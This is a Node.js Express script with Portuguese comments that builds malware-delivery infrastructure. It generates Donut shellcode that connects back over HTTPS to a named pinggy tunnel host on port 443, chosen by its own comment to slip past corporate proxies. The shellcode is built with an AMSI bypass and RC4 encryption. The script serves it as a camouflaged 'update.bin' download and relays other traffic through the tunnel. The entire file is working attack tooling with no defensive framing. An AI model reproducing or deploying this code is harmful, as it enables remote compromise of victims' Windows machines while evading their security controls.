// ---------- CONFIGURAÇÕES ----------
const DESTINO     = 'http://wofka-164-163-214-220.a.free.pinggy.link'; // túnel SSH
const DONUT_FILE  = './update.bin';        // shellcode Donut gerado (será criado na 1ª exec)
const LHOST       = 'wofka-164-163-214-220.a.free.pinggy.link';        // igual DESTINO, mas sem http://
const LPORT       = 443;                   // 443 para burlar proxy corporativo
const USER_AGENT  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'; // fingerprint comum

const express     = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const fs          = require('fs');
const { spawn }   = require('child_process');

const app = express();

// ---------- GERA O DONUT NA 1ª VEZ ----------
if (!fs.existsSync(DONUT_FILE)) {
  console.log('[+] Gerando shellcode Donut…');
  // gera um PE de 64 bits que conecta de volta ao LHOST:LPORT via HTTPS
  spawn('donut',
    ['-f', '1',          // formato shellcode binário puro
     '-p', 'https',      // transporte
     '-a', '2',          // arquitetura x64
     '-b', '1',          // bypass AMSI
     '-e', '3',          // criptografia RC4 (chave randômica)
     '-o', DONUT_FILE,
     '-y', `${LHOST}:${LPORT}`], // parâmetro interno do loader
    { stdio: 'inherit' });
}

// ---------- DISPENSER CAMUFLADO ----------
app.get('/update.bin', (_req, res) => {
  res.set({
    'Content-Type'        : 'application/octet-stream',
    'Content-Disposition' : 'attachment; filename="update.bin"',
    'X-Content-Type-Options': 'nosniff'
  });
  fs.createReadStream(DONUT_FILE).pipe(res);
});

// ---------- REDIRECIONADOR NORMAL ----------
app.use('/', createProxyMiddleware({
  target: DESTINO,
  changeOrigin: true,
  ws: true,
  onProxyReq: (p) => p.setHeader('x-pinggy-no-screen','true'),
  onProxyRes: (p) => {
    p.headers['content-type'] = 'application/octet-stream';
    p.headers['X-Content-Type-Options'] = 'nosniff';
  },
  onError: (e,_,r) => { console.error(e); r.status(502).send('Reconectando…'); }
}));

// ---------- HEALTH CHECK ----------
app.get('/health', (_q, r) => r.send('OK'));

app.listen(process.env.PORT || 3000);
